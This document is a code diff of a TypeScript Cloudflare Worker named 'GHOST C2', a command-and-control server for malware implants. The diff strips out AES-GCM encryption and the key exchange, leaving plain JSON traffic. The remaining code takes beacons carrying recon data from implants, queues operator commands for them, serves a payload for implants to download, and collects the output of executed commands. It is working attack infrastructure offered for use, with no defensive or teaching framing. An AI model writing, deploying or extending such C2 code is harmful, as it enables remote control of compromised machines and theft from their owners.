@@ -1,11 +1,10 @@
 /**
  * GHOST C2 — Cloudflare Worker
  *
- * - URL-decodes session IDs (fixes pipe character issue).
+ * PLAIN JSON version – no encryption, no PSK.
+ * - URL-decodes session IDs.
  * - Results kept by default; ?clear=1 removes.
- * - KV operations retried up to 3 times with exponential backoff.
- * - Safe JSON parse — never throws on malformed bodies.
- * - Session TTL is respected inside appendResult (was hardcoded 86400).
+ * - KV operations retried.
  * - All operator routes require X-Operator-Token; beacon routes require X-Beacon-Token.
  */
 
@@ -15,7 +14,6 @@ interface Env {
   GHOST_KV: KVNamespace;
   BEACON_TOKEN: string;
   OPERATOR_TOKEN: string;
-  SESSION_KEY_PSK: string;
   /** Seconds before an idle session expires. Default: 600. */
   SESSION_TIMEOUT_SECONDS: string;
   /** Allowed CORS origin. Default: * */
@@ -42,14 +40,11 @@ interface ResultEntry {
 interface BeaconRequest {
   session?: string;
   recon?: Record<string, unknown>;
-  key?: string;
-  enc?: string;
 }
 
 interface ResultRequest {
   session?: string;
   output?: string;
-  enc?: string;
 }
 
 interface TaskRequest {
@@ -80,41 +75,6 @@ const PAYLOAD_TTL = 86_400 * 30;
 const KV_MAX_RETRIES = 3;
 const KV_RETRY_BASE_MS = 200;
 
-// ─── Crypto Helpers ───────────────────────────────────────
-
-async function decryptAesGcm(keyBytes: Uint8Array, b64Ciphertext: string): Promise<string> {
-  const data = Uint8Array.from(atob(b64Ciphertext), c => c.charCodeAt(0));
-  if (data.length < 28) throw new Error("Ciphertext too short");
-  const iv = data.slice(0, 12);
-  const tag = data.slice(12, 28);
-  const ct = data.slice(28);
-  
-  const ctWithTag = new Uint8Array(ct.length + tag.length);
-  ctWithTag.set(ct, 0);
-  ctWithTag.set(tag, ct.length);
-
-  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
-  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, ctWithTag);
-  return new TextDecoder().decode(decrypted);
-}
-
-async function encryptAesGcm(keyBytes: Uint8Array, plaintext: string): Promise<string> {
-  const iv = crypto.getRandomValues(new Uint8Array(12));
-  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
-  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, new TextEncoder().encode(plaintext));
-  
-  const buf = new Uint8Array(encrypted);
-  const ct = buf.slice(0, buf.length - 16);
-  const tag = buf.slice(buf.length - 16);
-  
-  const out = new Uint8Array(12 + 16 + ct.length);
-  out.set(iv, 0);
-  out.set(tag, 12);
-  out.set(ct, 28);
-  
-  return btoa(String.fromCharCode(...out));
-}
-
 // ─── Helpers ──────────────────────────────────────────────
 
 function jsonResponse(data: unknown, status = 200): Response {
@@ -128,10 +88,6 @@ function errorResponse(message: string, status: number): Response {
   return jsonResponse({ error: message }, status);
 }
 
-/**
- * Constant-time string comparison — prevents timing oracle on token auth.
- * Falls back to false immediately on length mismatch (no encoding needed).
- */
 function secureCompare(a: string, b: string): boolean {
   if (a.length !== b.length) return false;
   const enc = new TextEncoder();
@@ -163,7 +119,6 @@ function now(): string {
   return new Date().toISOString();
 }
 
-/** Safe JSON parse — returns null instead of throwing on malformed input. */
 async function safeJson<T>(request: Request): Promise<T | null> {
   try {
     return (await request.json()) as T;
@@ -206,7 +161,7 @@ async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
 // ─── KV: Session ──────────────────────────────────────────
 
 function sessionKey(sid: string): string { return `session:${sid}`; }
-function tasksKey(sid: string): string   { return `tasks:${sid}`; }
+function tasksKey(sid: string): string { return `tasks:${sid}`; }
 function resultsKey(sid: string): string { return `results:${sid}`; }
 
 async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
@@ -248,7 +203,6 @@ async function putTasks(
     } else {
       await kv.put(tasksKey(sid), JSON.stringify(tasks), { expirationTtl: TASK_TTL });
     }
-    // Keep denormalized pending_tasks count in sync.
     const raw = await kv.get(sessionKey(sid));
     if (raw) {
       const data = JSON.parse(raw) as SessionData;
@@ -282,20 +236,12 @@ async function appendResult(
 ): Promise<void> {
   await withRetry(async () => {
     const results = await getResults(kv, sid);
-
-    // Evict oldest if at cap.
     if (results.length >= RESULT_CAP) results.shift();
     results.push(entry);
-
-    // Byte-cap: trim from the front until under limit.
     while (results.length > 1 && JSON.stringify(results).length > RESULT_BYTE_CAP) {
       results.shift();
     }
-
     await putResults(kv, sid, results);
-
-    // Sync denormalized result_count. Use the caller-provided TTL, not a
-    // hardcoded 86400 — previously this ignored the session's actual timeout.
     const raw = await kv.get(sessionKey(sid));
     if (raw) {
       const data = JSON.parse(raw) as SessionData;
@@ -304,8 +250,6 @@ async function appendResult(
     }
   });
 }
-
-// ─── KV: Sessions List ────────────────────────────────────
 
 async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
   return withRetry(async () => {
@@ -319,8 +263,6 @@ async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
     return keys;
   });
 }
-
-// ─── KV: Audit Log ────────────────────────────────────────
 
 async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
   await withRetry(async () => {
@@ -363,44 +305,13 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
   const ip = getClientIP(request);
   const ttl = getSessionTTL(env);
 
-  // Phase 1: Key exchange
-  if (body.key && env.SESSION_KEY_PSK) {
-    try {
-      const pskBytes = new Uint8Array(env.SESSION_KEY_PSK.match(/.{1,2}/g)!.map(byte => parseInt(byte, 16)));
-      const sessionKeyRawStr = await decryptAesGcm(pskBytes, body.key);
-      const sessionKeyB64 = btoa(sessionKeyRawStr);
-      await env.GHOST_KV.put(`sessionkey:${sid}`, sessionKeyB64, { expirationTtl: ttl });
-      console.log(`[beacon] sid=${sid} ip=${ip} key-exchange ok`);
-    } catch (e) {
-      console.error(`[beacon] sid=${sid} ip=${ip} key-exchange failed`);
-      return errorResponse("Key exchange failed", 400);
-    }
-  }
-
-  // Phase 2: Decrypt payload
-  let plainBody = body;
-  let sessionKeyBytes: Uint8Array | null = null;
-  if (body.enc) {
-    const storedKeyB64 = await env.GHOST_KV.get(`sessionkey:${sid}`);
-    if (storedKeyB64) {
-      try {
-        sessionKeyBytes = Uint8Array.from(atob(storedKeyB64), c => c.charCodeAt(0));
-        const decryptedStr = await decryptAesGcm(sessionKeyBytes, body.enc);
-        const parsed = JSON.parse(decryptedStr);
-        plainBody = { session: sid, recon: parsed.recon };
-      } catch (e) {
-        console.error(`[beacon] sid=${sid} ip=${ip} decrypt failed`);
-      }
-    }
-  }
-
   const existing = await getSession(env.GHOST_KV, sid);
   const session: SessionData = {
     session: sid,
     remote_ip: ip,
     first_seen: existing?.first_seen ?? ts,
     last_beacon: ts,
-    recon: plainBody.recon ?? existing?.recon ?? {},
+    recon: body.recon ?? existing?.recon ?? {},
     pending_tasks: existing?.pending_tasks ?? 0,
     result_count: existing?.result_count ?? 0,
   };
@@ -416,11 +327,6 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
     console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
   }
 
-  if (sessionKeyBytes) {
-    const encResult = await encryptAesGcm(sessionKeyBytes, JSON.stringify({ cmd }));
-    return jsonResponse({ enc: encResult });
-  }
-
   return jsonResponse({ cmd });
 }
 
@@ -431,30 +337,9 @@ async function handleResult(request: Request, env: Env): Promise<Response> {
   const sid = clamp(String(body.session), MAX_SESSION_LEN);
   const ttl = getSessionTTL(env);
 
-  let outputStr = body.output;
-  if (body.enc) {
-    const storedKeyB64 = await env.GHOST_KV.get(`sessionkey:${sid}`);
-    if (storedKeyB64) {
-      try {
-        const sessionKeyBytes = Uint8Array.from(atob(storedKeyB64), c => c.charCodeAt(0));
-        const decryptedStr = await decryptAesGcm(sessionKeyBytes, body.enc);
-        const parsed = JSON.parse(decryptedStr);
-        outputStr = parsed.output;
-      } catch (e) {
-        console.error(`[result] sid=${sid} decrypt failed`);
-      }
-    }
-  }
-
-  if (outputStr === undefined) {
-    return errorResponse("Missing output data", 400);
-  }
-
-  const output = clamp(String(outputStr), MAX_OUTPUT_LEN);
-
+  const output = clamp(String(body.output ?? ""), MAX_OUTPUT_LEN);
   await appendResult(env.GHOST_KV, sid, { ts: now(), output }, ttl);
 
-  // Re-register session if it expired between task dispatch and result delivery.
   const existing = await getSession(env.GHOST_KV, sid);
   if (!existing) {
     const ts = now();
@@ -619,24 +504,18 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
   const { pathname: path, } = url;
   const method = request.method;
 
-  // CORS preflight — respond immediately, no auth required.
   if (method === "OPTIONS") {
     return withCORS(new Response(null, { status: 204 }), env);
   }
 
-  // ── Public ──────────────────────────────────────────────
   if (path === "/health" && method === "GET") {
     return withCORS(handleHealth(), env);
   }
 
-  // Lightweight TCP keepalive — no auth, no KV, no overhead.
-  // Implant heartbeat thread hits this every 120 s to keep the
-  // Cloudflare connection warm without touching session state.
   if (path === "/ping" && method === "GET") {
     return withCORS(new Response("OK", { status: 200 }), env);
   }
 
-  // ── Beacon routes (X-Beacon-Token) ──────────────────────
   if (path === "/beacon" && method === "POST") {
     const authErr = requireBeaconToken(request, env);
     if (authErr) return withCORS(authErr, env);
@@ -649,14 +528,12 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     return withCORS(await handleResult(request, env), env);
   }
 
-  // Payload download uses beacon token — implant fetches it.
   if (path === "/payload" && method === "GET") {
     const authErr = requireBeaconToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleDownloadPayload(env), env);
   }
 
-  // ── Operator routes (X-Operator-Token) ──────────────────
   if (path === "/sessions" && method === "GET") {
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
@@ -681,7 +558,6 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     return withCORS(await handleUploadPayload(request, env), env);
   }
 
-  // ── Parameterised operator routes ───────────────────────
   const resultsMatch = path.match(/^\/results\/(.+)$/);
   if (resultsMatch && method === "GET") {
     const authErr = requireOperatorToken(request, env);
@@ -698,8 +574,6 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
 
   return withCORS(errorResponse("Not found", 404), env);
 }
-
-// ─── Entry Point ──────────────────────────────────────────
 
 export default {
   async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
